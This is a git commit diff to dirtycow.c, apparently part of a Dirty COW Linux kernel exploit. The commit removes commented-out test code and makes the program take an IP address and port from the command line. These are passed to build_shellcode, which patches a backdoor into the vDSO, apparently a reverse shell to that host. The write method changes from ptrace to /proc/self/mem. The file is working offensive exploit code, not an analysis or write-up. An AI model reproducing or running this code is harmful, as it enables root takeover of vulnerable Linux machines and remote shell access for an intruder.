d6bb98264184d383e6a462dabc50d364f1c0fb42
explorer <hsadkhk@gmail.com>
2022-12-20 17:40:37 +0800

    add ip port parse

--- dirtycow.c
+++ dirtycow.c
@@ -1,47 +1,37 @@
 #include <stdio.h>
-#include <sys/mman.h>
-#include <sys/stat.h>
-#include <fcntl.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <stdlib.h>
+
 #include "exploit.h"
 #include "dirtycow.h"
 #include "vdso_backdoor.h"
+#include "unit.h"
 
-//int main() {
-//    char *filename = "/foo";
-//    int fd = open(filename, O_RDONLY);
-//    struct stat st;
-//    fstat(fd, &st);
-//
-//    unsigned char *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-//
-//    printf("map %p\n", map);
-//    printf("content: %s\n", map);
-//
-//    struct mem_vec vec;
-//    vec.address = map;
-//    vec.data = "fuck";
-//    vec.size = 4;
-//    exploit(&vec, 1,  PRTACE_POKEDATA);
-//
-//    return 0;
-//}
-
-int main() {
+int main(int argc, char *argv[]) {
     unsigned int shellcode_size;
     unsigned char *shellcode;
-    build_shellcode(&shellcode, &shellcode_size, 0x9f3010ac, 0x3930);
+
+    if (argc != 3) {
+        printf("usage: %s ip port\n", argv[0]);
+        fflush(stdout);
+        _exit(0);
+    }
+
+    struct in_addr ip;
+    if(!inet_aton(argv[1], &ip)) {
+        warn("error ip");
+    }
+
+    unsigned short port = htons(atoi(argv[2]));
+
+    build_shellcode(&shellcode, &shellcode_size, ip.s_addr, port);
 
     struct mem_vec * vecs;
     unsigned int size;
     get_vdso_patch_vec(&vecs, &size, shellcode, shellcode_size);
 
-//    for(int i=0;i<size;i++) {
-//        printf("vecs[%d]: \n", i);
-//        for(int j=0;j<vecs[i].size;j++){
-//            printf("%02x", vecs[i].data[j]);
-//        }
-//        printf("\n");
-//    }
-
-    exploit(vecs, size, PTRACE);
+    exploit(vecs, size, PROC_SELF_MEM);
 }
